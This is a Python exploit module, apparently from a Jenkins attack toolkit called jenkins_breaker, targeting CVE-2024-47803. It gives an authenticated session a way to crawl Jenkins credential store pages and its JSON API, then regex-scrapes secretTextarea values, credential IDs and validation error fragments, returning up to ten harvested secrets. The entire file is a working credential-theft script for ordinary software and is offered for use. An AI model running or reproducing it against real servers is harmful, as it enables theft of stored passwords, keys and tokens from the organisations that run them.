"""
CVE-2024-47803: Jenkins Multi-Line Secret Exposure via Error Messages

This exploit leverages a vulnerability in Jenkins that exposes multi-line secret values
in error messages generated for the secretTextarea form field.
"""

import re
from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2024_47803(ExploitModule):
    """Jenkins multi-line secret exposure via error messages."""

    CVE_ID = "CVE-2024-47803"

    METADATA = ExploitMetadata(
        cve_id="CVE-2024-47803",
        name="Jenkins Multi-Line Secret Exposure",
        description="Exposure of multi-line secret values in error messages for secretTextarea form fields",
        affected_versions=["Jenkins <= 2.478", "LTS <= 2.462.2"],
        mitre_attack=["T1190", "T1552.001", "T1213"],
        severity="medium",
        references=[
            "https://www.jenkins.io/security/advisory/2024-10-02/",
            "https://nvd.nist.gov/vuln/detail/CVE-2024-47803",
            "https://advisories.gitlab.com/pkg/maven/org.jenkins-ci.main/jenkins-core/CVE-2024-47803"
        ],
        requires_auth=True,
        requires_crumb=False,
        tags=["credential-exposure", "information-disclosure", "secrets"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance is vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/credentials/")
            return response.status_code in [200, 403]
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2024-47803 to expose multi-line secrets.

        This attempts to trigger error messages that may expose multi-line secrets
        configured in Jenkins credentials.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
                - credential_id (str): Specific credential ID to target (optional)

        Returns:
            ExploitResult: Result of the exploit
        """
        kwargs.get('credential_id')
        exposed_secrets = []

        try:
            response = session.get("/credentials/store/system/domain/_/")

            if response.status_code == 200:
                content = response.text

                credential_patterns = [
                    r'id="([^"]+)".*?class="secret.*?textarea',
                    r'credential.*?id["\s]*[:=]["\s]*([a-zA-Z0-9_-]+)',
                    r'secretTextarea.*?value="([^"]*)"',
                ]

                for pattern in credential_patterns:
                    matches = re.findall(pattern, content, re.DOTALL | re.IGNORECASE)
                    for match in matches:
                        if match and len(match) > 10:
                            exposed_secrets.append(match)

                if exposed_secrets:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="success",
                        details=f"Found {len(exposed_secrets)} potential secret exposures in credential configurations",
                        data={
                            "exposed_secrets_count": len(exposed_secrets),
                            "secrets": exposed_secrets[:5],
                            "method": "Error message analysis",
                            "note": "Secrets may be partially exposed in form validation errors"
                        }
                    )

            response = session.get("/credentials/store/system/domain/_/api/json?tree=credentials[id,description]")

            if response.status_code == 200:
                data = response.json()
                credentials = data.get('credentials', [])

                if credentials:
                    credential_ids = [cred.get('id') for cred in credentials if cred.get('id')]

                    for cred_id in credential_ids[:10]:
                        try:
                            cred_response = session.get(f"/credentials/store/system/domain/_/credential/{cred_id}/")

                            if cred_response.status_code == 200:
                                error_patterns = [
                                    r'<div class="error">([^<]+)</div>',
                                    r'validation.*?error.*?:\s*([^\n<]+)',
                                    r'secretTextarea.*?error.*?"([^"]+)"',
                                ]

                                for pattern in error_patterns:
                                    matches = re.findall(pattern, cred_response.text, re.DOTALL | re.IGNORECASE)
                                    if matches:
                                        exposed_secrets.extend(matches)
                        except Exception:
                            continue

                    if exposed_secrets:
                        return ExploitResult(
                            exploit=self.CVE_ID,
                            status="success",
                            details=f"Extracted {len(exposed_secrets)} potential secret fragments from error messages",
                            data={
                                "credential_ids_checked": len(credential_ids),
                                "exposed_secrets": exposed_secrets[:10],
                                "method": "Credential configuration error analysis"
                            }
                        )
                    else:
                        return ExploitResult(
                            exploit=self.CVE_ID,
                            status="failure",
                            details="No multi-line secrets exposed in error messages",
                            data={
                                "credential_ids_checked": len(credential_ids),
                                "note": "Target may be patched or secrets not configured with secretTextarea"
                            }
                        )
                else:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="failure",
                        details="No credentials found on Jenkins instance",
                        error="No credentials available"
                    )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Failed to access credentials API: HTTP {response.status_code}",
                    error=f"HTTP {response.status_code}"
                )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Exploitation failed: {str(e)}",
                error=str(e)
            )
